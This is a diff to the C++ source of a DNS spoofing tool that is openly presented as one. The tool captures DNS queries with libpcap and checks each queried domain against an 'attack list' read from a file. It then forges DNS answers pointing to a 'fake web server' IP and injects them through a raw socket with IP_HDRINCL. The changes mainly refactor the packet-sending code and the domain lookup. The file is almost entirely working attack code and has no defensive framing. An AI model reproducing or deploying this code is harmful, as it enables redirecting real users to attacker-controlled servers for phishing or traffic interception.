@@ -23,14 +23,16 @@ std::vector<std::string> fake_web_server_array;
 
 int packet_capture_start(void);
 void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char *pkt_data);
+void sned_dns_packet(char *target_ip, int port, unsigned char *dns_packet,int size);
 void print_packet_data(const struct pcap_pkthdr *header, const u_char *pkt_data);
 void make_domain(const struct pcap_pkthdr *header, const u_char *pkt_data, char* result);
 char *set_my_ip(char *interface_name);
+bool compare_domain(const char *target_domain, std::vector<std::string> domain_array);
 
 std::vector<std::pair<std::string, std::string> > read_info_from_file(const char* file_name);
+void set_dom_and_ip(std::vector<std::pair<std::string, std::string> > attack_list, std::vector<std::string> &web_arr, std::vector<std::string> &dom_arr);
 std::vector<std::string> make_domain_arr(std::vector<std::pair<std::string, std::string> > attack_list);
 std::vector<std::string> make_fake_web_arr(std::vector<std::pair<std::string, std::string> > attack_list);
-bool compare_domain(const char *target_domain, std::vector<std::string> domain_array);
 
 int packet_capture_start(){
     struct bpf_program fcode;
@@ -41,13 +43,16 @@ int packet_capture_start(){
     pcap_if_t *d;
     int i = 0;
 
+    std::vector<char*> interface_list;
+    int select_interface_number;
+
     struct pcap_pkthdr header;
 	const unsigned char* pkt_data = NULL;
 
     const char * filter = "port 53 and (udp and (udp[10] & 128 = 0))";     // Recv
-    // const char * filter = "port 53 and (udp and (not udp[10] & 128 = 0))";  // Send\
 
     attack_list = read_info_from_file(attack_info_file);
+    set_dom_and_ip(attack_list, fake_web_server_array, domain_array);
 
     if(attack_list.size()==0){
         return -1;
@@ -57,8 +62,6 @@ int packet_capture_start(){
         printf("pcap_findalldevs error\n");
         return -2;
     }
-
-    std::vector<char*> interface_list;
 
 	for (d = alldevs; d; d = d->next) {
         if(d->next==NULL){
@@ -80,7 +83,6 @@ int packet_capture_start(){
 	}
     printf("└────┴─────────────┘\n");
     
-    int select_interface_number;
 	printf("Enter the interface number you would like to sniff : ");
 	scanf("%d", &select_interface_number);
 
@@ -115,9 +117,6 @@ int packet_capture_start(){
 
     pcap_freealldevs(alldevs);
 
-    domain_array = make_domain_arr(attack_list);
-    fake_web_server_array = make_fake_web_arr(attack_list);
-
     while (1) {
         if ((pkt_data = pcap_next(adhandle, &header)) != NULL) {
             packet_handler(NULL, &header, pkt_data);
@@ -127,27 +126,29 @@ int packet_capture_start(){
     return 0;
 }
 
-void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char *pkt_data) {
+void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
     ether_header *eth = (ether_header*)(pkt_data);
     ip_header *ip = (ip_header*)(pkt_data+sizeof(ether_header));
     udp_header *udp = (udp_header*)(pkt_data+sizeof(ether_header)+sizeof(ip_header));
     dns_header *dns = (dns_header*)(pkt_data + 42);
+
     char extract_domain[1024];
     char fake_webserver_ip[16];
     memset(extract_domain, 0x00, 1024);
     make_domain(header, pkt_data, extract_domain);
 
-    if(strcmp(extract_domain, "")==0){
-        return;
-    }
+    char source_ip[16];
+    char dest_ip[16];
 
-    if(compare_domain(extract_domain, domain_array)){
-        char source_ip[16];
-        char dest_ip[16];
-        int sport = ntohs(udp->sport);
-        int dport = ntohs(udp->dport);
-        int dns_id = ntohs(dns->ID);
-        char display_domain[1024];
+    int sport = ntohs(udp->sport);
+    int dport = ntohs(udp->dport);
+    int dns_id = ntohs(dns->ID);
+
+    char display_domain[1024];
+    unsigned char dns_response[1024];
+    unsigned char *dns_reply_hdr;
+
+    if(strcmp(extract_domain, "")!=0 && compare_domain(extract_domain, domain_array)){
         memset(display_domain, 0x00, 1024);
         memcpy(display_domain, extract_domain, 1024);
         if(strlen(display_domain)>16){
@@ -169,16 +170,15 @@ void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char
         printf("├────┼─────────────────┼───────┼─────────────────┼───────┼───────────┼────────┼───┼─────────────────┤\n");
         printf("│Recv│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ Q │ %-16s│\n", source_ip, sport, dest_ip, dport, header->caplen,dns_id, display_domain);
 
-        unsigned char dns_response[1024];
         memset(dns_response, 0x00, 1024);
-        unsigned char* dns_reply_hdr = dns_response + sizeof(ip_header) + sizeof(udp_header);
+        dns_reply_hdr = dns_response + sizeof(ip_header) + sizeof(udp_header);
 
         dns_reply_hdr[0]=dns->ID & 0xff; dns_reply_hdr[1]=(dns->ID >> 8) & 0xff;
         dns_reply_hdr[2]=0x81; dns_reply_hdr[3]=0x80;
         dns_reply_hdr[4]=dns->QDCNT & 0xff; dns_reply_hdr[5]=(dns->QDCNT >> 8) & 0xff;
         dns_reply_hdr[6]=0x00; dns_reply_hdr[7]=0x01;
-        dns_reply_hdr[8] = dns->NSCNT & 0xff; dns_reply_hdr[9]=(dns->NSCNT >> 8) & 0xff;
-        dns_reply_hdr[10] = dns->ARCNT & 0xff; dns_reply_hdr[11]=(dns->ARCNT >> 8) & 0xff;
+        dns_reply_hdr[8]=dns->NSCNT & 0xff; dns_reply_hdr[9]=(dns->NSCNT >> 8) & 0xff;
+        dns_reply_hdr[10]=dns->ARCNT & 0xff; dns_reply_hdr[11]=(dns->ARCNT >> 8) & 0xff;
     
         int size = header->caplen-54-4;
 
@@ -222,32 +222,36 @@ void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char
         memcpy(&dns_response[0], (char *)ip, sizeof(ip_header));
         memcpy(&dns_response[sizeof(ip_header)], (char *)udp, sizeof(udp_header));
 
-        full_size = full_size + (sizeof(ip_header) + sizeof(udp_header));
-        struct sockaddr_in serv_addr;
-        int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-
-        serv_addr.sin_family = AF_INET;
-        serv_addr.sin_port = htons(temp_port);
-
         char target_ip[16];
         snprintf(target_ip, sizeof(target_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
+        full_size = full_size + (sizeof(ip_header) + sizeof(udp_header));
 
-        inet_pton(AF_INET, target_ip, &(serv_addr.sin_addr));
-        int tmp = 1;
-
-        if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
-            printf("setsockopt hdrincl error\n");
-        };
-
-        int result = sendto(sfd, dns_response, full_size, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
-
-        if(result < 0) {
-            printf("error sending udp %d\n", result);
-        }
+        sned_dns_packet(target_ip, udp->dport, dns_response, full_size);
         
         printf("│Send│ %-16s│ %-5d │ %-16s│ %-5d │ %3d Bytes │ 0x%-4x │ A │ %-16s│\n", my_ip, dport, source_ip, sport, full_size,dns_id, fake_webserver_ip);
         printf("└────┴─────────────────┴───────┴─────────────────┴───────┴───────────┴────────┴───┴─────────────────┘");
         fflush(stdout);
+    }
+}
+
+void sned_dns_packet(char *target_ip, int port, unsigned char *dns_packet,int size){
+    struct sockaddr_in serv_addr;
+    int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(port);
+
+    inet_pton(AF_INET, target_ip, &(serv_addr.sin_addr));
+    int tmp = 1;
+
+    if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
+      printf("setsockopt hdrincl error\n");
+    };
+
+    int result = sendto(sfd, dns_packet, size, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
+
+    if (result < 0) {
+      printf("error sending udp %d\n", result);
     }
 }
 
@@ -358,11 +362,21 @@ char *set_my_ip(char *interface_name){
     struct ifreq ifr;
     fd = socket(AF_INET, SOCK_DGRAM, 0);
     ifr.ifr_addr.sa_family = AF_INET;
-    strncpy(ifr.ifr_name, "ens33", IFNAMSIZ - 1);
+    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);
     ioctl(fd, SIOCGIFADDR, &ifr);
     close(fd);
 
     return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+}
+
+bool compare_domain(const char *target_domain, std::vector<std::string> domain_array){
+    for(int i=0;i<domain_array.size();i++){
+        if(strcmp(target_domain, domain_array[i].c_str())==0){
+            return true;
+        }
+    }
+
+    return false;
 }
 
 std::vector<std::pair<std::string, std::string> > read_info_from_file(const char* file_name){
@@ -400,6 +414,22 @@ std::vector<std::pair<std::string, std::string> > read_info_from_file(const char
     return vec;
 }
 
+void set_dom_and_ip(std::vector<std::pair<std::string, std::string> > attack_list, std::vector<std::string> &web_arr, std::vector<std::string> &dom_arr){
+    std::vector<std::string> temp;
+    
+    for(int i=0;i<attack_list.size();i++){
+        temp.push_back(attack_list[i].first);
+    }
+    web_arr = temp;
+    temp.clear();
+
+    for(int i=0;i<attack_list.size();i++){
+        temp.push_back(attack_list[i].second);
+    }
+    dom_arr = temp;
+    temp.clear();
+}
+
 std::vector<std::string> make_domain_arr(std::vector<std::pair<std::string, std::string> > attack_list){
     std::vector<std::string> temp;
     
@@ -418,14 +448,4 @@ std::vector<std::string> make_fake_web_arr(std::vector<std::pair<std::string, st
     }
 
     return temp;
-}
-
-bool compare_domain(const char *target_domain, std::vector<std::string> domain_array){
-    for(int i=0;i<domain_array.size();i++){
-        if(strcmp(target_domain, domain_array[i].c_str())==0){
-            return true;
-        }
-    }
-
-    return false;
 }
